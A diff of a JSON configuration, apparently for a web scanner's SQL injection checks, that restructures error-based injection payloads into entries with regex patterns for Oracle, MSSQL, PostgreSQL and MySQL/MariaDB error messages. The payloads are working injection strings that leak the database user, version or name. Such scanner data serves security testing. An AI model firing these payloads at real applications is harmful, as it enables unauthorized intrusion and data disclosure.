@@ -15,23 +15,58 @@
                 "mysqli_fetch_array() expects parameter"
             ],
             "type": "regex"
-        }
-    ],
-    "technology_specific_payloads":
-    {
-        "oracle":["' AND 1=to_number((SELECT user FROM dual))--"],
-        "mysql":["' AND updatexml(1,concat(0x7e,user(),0x7e),1)--",
-                "' AND extractvalue(1,concat(0x7e,database(),0x7e))--"],
-        "postgresql":[
-            "'::int",
-            "'||(SELECT version())||'"
-        ],
-        "mariadb":[
+        },
+        {
+            "payload": [
+                "' AND 1=to_number((SELECT user FROM dual))--"
+            ],
+            "verify": [
+                "INVALID_NUMBER",
+                "invalid number",
+                "VALUE_ERROR",
+                "ORA-06502",
+                "ORA-01722",
+                "PL/SQL: numeric or value error"
+            ],
+            "type": "regex",
+            "tags": ["oracle"]
+        },
+        {
+            "payload": [
+                "' AND 1=CONVERT(int,(SELECT @@version))--",
+                "' AND 1=CAST((SELECT SYSTEM_USER) AS int)--"
+            ],
+            "verify": [
+                "Incorrect syntax near ",
+                "yntax error"
+            ],
+            "type": "regex",
+            "tags": ["microsoftsql"]
+        },
+        {
+            "payload": [
+                "'::int",
+                "'||(SELECT version())||'"
+            ],
+            "verify": [
+                "syntax error at or near ",
+                "ERROR:  invalid input syntax for integer:"
+            ],
+            "type": "regex",
+            "tags": ["postgresql"]
+        },
+        {
+            "payload": [
                 "' AND updatexml(1,concat(0x7e,user(),0x7e),1)--",
                 "' AND extractvalue(1,concat(0x7e,database(),0x7e))--"
-        ],
-        "microsoftsql":[
-            "' AND 1=CONVERT(int,(SELECT @@version))--",
-            "' AND 1=CAST((SELECT SYSTEM_USER) AS int)--"]
-    }
+            ],
+            "verify": [
+                "You have an error in your SQL syntax;",
+                "Unknown column",
+                "mysqli_fetch_array() expects parameter"
+            ],
+            "type": "regex",
+            "tags": ["mysql", "mariadb"]
+        }
+    ]
 }
